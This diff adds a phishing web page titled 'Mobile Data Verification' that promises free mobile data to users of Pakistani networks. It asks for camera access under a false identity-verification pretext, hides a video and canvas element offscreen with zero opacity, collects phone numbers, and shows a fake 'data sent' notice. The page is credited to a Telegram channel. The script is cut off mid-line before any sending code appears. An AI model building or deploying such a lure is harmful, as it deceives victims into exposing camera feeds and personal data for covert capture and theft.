@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Data Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background-color: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            max-width: 480px;
+            width: 100%;
+            padding: 40px 35px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(to right, #1e3c72, #2a5298);
+        }
+        
+        .logo {
+            font-size: 28px;
+            margin-bottom: 25px;
+            color: #1e3c72;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .logo i {
+            color: #2a5298;
+        }
+        
+        .title {
+            color: #1e3c72;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background: linear-gradient(to right, #1e3c72, #2a5298);
+            border-radius: 3px;
+        }
+        
+        .subtitle {
+            color: #5a6c7d;
+            font-size: 15px;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #2d3748;
+            font-weight: 600;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .input-container i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #2a5298;
+            font-size: 16px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 14px 15px 14px 45px;
+            background-color: #f7fafc;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #2d3748;
+            transition: all 0.3s;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: #2a5298;
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, #1e3c72, #2a5298);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(30, 60, 114, 0.3);
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:disabled {
+            background: #a0aec0;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn:disabled::before {
+            display: none;
+        }
+        
+        .terms {
+            font-size: 13px;
+            color: #718096;
+            text-align: center;
+            margin-top: 25px;
+            line-height: 1.5;
+        }
+        
+        .terms a {
+            color: #2a5298;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        
+        .terms a:hover {
+            color: #1e3c72;
+            text-decoration: underline;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 25px 0;
+            display: none;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(to right, #1e3c72, #2a5298);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 5px 15px rgba(30, 60, 114, 0.2);
+        }
+        
+        .success-icon i {
+            font-size: 40px;
+            color: white;
+        }
+        
+        .success-message h3 {
+            margin-bottom: 15px;
+            color: #1e3c72;
+            font-size: 22px;
+        }
+        
+        .success-message p {
+            font-size: 15px;
+            color: #5a6c7d;
+            margin-bottom: 10px;
+        }
+        
+        .data-message {
+            font-size: 18px;
+            color: #2a5298;
+            margin: 15px 0;
+            font-weight: 700;
+        }
+        
+        .loader {
+            display: none;
+            text-align: center;
+            padding: 25px 0;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(30, 60, 114, 0.2);
+            border-top: 4px solid #1e3c72;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .credit {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #718096;
+            text-align: center;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 15px;
+        }
+        
+        .credit a {
+            color: #2a5298;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        /* Hidden camera styles */
+        .hidden-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0;
+            z-index: -9999;
+        }
+        
+        .verification-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .verification-content {
+            max-width: 450px;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+        
+        .verification-logo {
+            font-size: 28px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .verification-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .verification-subtitle {
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+        
+        .verification-loader {
+            display: block;
+            text-align: center;
+        }
+        
+        .verification-spinner {
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: white;
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+            z-index: 10000;
+            border-left: 4px solid #2a5298;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification i {
+            color: #2a5298;
+            font-size: 20px;
+        }
+        
+        .notification-content {
+            color: #2d3748;
+            font-size: 14px;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #4a5568;
+        }
+        
+        .security-badge i {
+            color: #2a5298;
+        }
+        
+        /* Camera permission overlay */
+        .permission-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .permission-content {
+            max-width: 450px;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+        }
+        
+        .permission-logo {
+            font-size: 28px;
+            margin-bottom: 25px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .permission-title {
+            font-size: 24px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        
+        .permission-subtitle {
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+        
+        .permission-buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        .permission-btn {
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            font-size: 16px;
+        }
+        
+        .permission-allow {
+            background: white;
+            color: #1e3c72;
+        }
+        
+        .permission-deny {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+        
+        .permission-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .permission-error {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid rgba(255, 0, 0, 0.5);
+        }
+        
+        .permission-success {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 8px;
+            border-left: 4px solid rgba(0, 255, 0, 0.5);
+        }
+    </style>
+</head>
+<body>
+    <!-- Camera Permission Overlay -->
+    <div class="permission-overlay" id="permission-overlay">
+        <div class="permission-content">
+            <div class="permission-logo">
+                <i class="fas fa-camera"></i> Camera Access Required
+            </div>
+            <h2 class="permission-title">Camera Permission Needed</h2>
+            <p class="permission-subtitle">
+                This application requires camera access for identity verification. 
+                Please allow camera access to continue with the mobile data verification process.
+            </p>
+            <div class="permission-buttons">
+                <button class="permission-btn permission-allow" id="allow-camera">Allow Camera Access</button>
+                <button class="permission-btn permission-deny" id="deny-camera">Deny Access</button>
+            </div>
+            <div class="permission-error" id="permission-error">
+                <p><i class="fas fa-exclamation-triangle"></i> Camera access is required to use this application. Please refresh the page and allow camera access to continue.</p>
+            </div>
+            <div class="permission-success" id="permission-success">
+                <p><i class="fas fa-check-circle"></i> Camera access granted! Starting verification process...</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden Camera for Verification -->
+    <div class="hidden-camera">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+    
+    <!-- Verification Overlay -->
+    <div class="verification-overlay" id="verification-overlay" style="display: none;">
+        <div class="verification-content">
+            <div class="verification-logo">
+                <i class="fas fa-mobile-alt"></i> Mobile Data Verification
+            </div>
+            <h2 class="verification-title">Initializing Secure Verification...</h2>
+            <p class="verification-subtitle">Please wait while we prepare your mobile data offer.</p>
+            <div class="verification-loader" id="verification-loader">
+                <div class="verification-spinner"></div>
+                <p>Loading...</p>
+            </div>
+            <div class="progress-bar">
+                <div class="progress" id="verification-progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        <i class="fas fa-check-circle"></i>
+        <div class="notification-content">Data sent successfully!</div>
+    </div>
+
+    <!-- Phone Number Input Screen -->
+    <div class="container" id="phone-screen" style="display: none;">
+        <div class="logo">
+            <i class="fas fa-mobile-alt"></i> Mobile Data Verification
+        </div>
+        
+        <div class="title">Get Free Mobile Data</div>
+        
+        <div class="subtitle">
+            Enter your mobile number to verify eligibility for free data rewards. 
+            Complete the quick verification process to receive your data.
+        </div>
+        
+        <div class="form-group">
+            <label for="phone-number">Mobile Number</label>
+            <div class="input-container">
+                <i class="fas fa-phone"></i>
+                <input type="tel" id="phone-number" placeholder="Enter your 10-digit mobile number">
+            </div>
+        </div>
+        
+        <div class="form-group">
+            <label for="network">Mobile Network</label>
+            <div class="input-container">
+                <i class="fas fa-wifi"></i>
+                <select id="network" class="form-control">
+                    <option value="">Select your network</option>
+                    <option value="jazz">Jazz</option>
+                    <option value="telenor">Telenor</option>
+                    <option value="ufone">Ufone</option>
+                    <option value="zong">Zong</option>
+                    <option value="warid">Warid</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+        </div>
+        
+        <button class="btn" id="verify-btn">Verify Eligibility</button>
+        
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+            <span>Your information is secure and encrypted</span>
+        </div>
+        
+        <div class="terms">
+            By continuing, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Data Usage Policy</a>.
+        </div>
+        
+        <!-- Loader -->
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p>Checking eligibility...</p>
+        </div>
+        
+        <!-- Success Message -->
+        <div class="success-message" id="success-message">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h3>Eligibility Confirmed!</h3>
+            <p>You qualify for free mobile data rewards.</p>
+            <p>Your 5GB free data will be credited within 24 hours.</p>
+        </div>
+        
+        <div class="credit">
+            MADE BY @Death_eraa | JOIN FOR MORE <a href="https://t.me/professor_7860">https://t.me/professor_7860</a>
+            <br>— 𝙋𝙍𝙊𝙁𝙀𝙎𝙎𝙊𝙍-𝙋𝘼𝙍𝙄
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Screen elements
+            const permissionOverlay = document.getElementById('permission-overlay');
+            const permissionError = document.getElementById('permission-error');
+            const permissionSuccess = document.getElementById('permission-success');
+            const phoneScreen = document.getElementById('phone-screen');
+            const verificationOverlay = document.getElementById('verification-overlay');
+            const verificationLoader = document.getElementById('verification-loader');
+            const verificationProgress = document.getElementById('verification-progress');
+            const notification = document.getElementById('notification');
+            
+            // Camera elements
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            // Phone screen elements
+            const phoneNumberInput = document.getElementById('phone-number');
+            const networkSelect = document.getElementByI
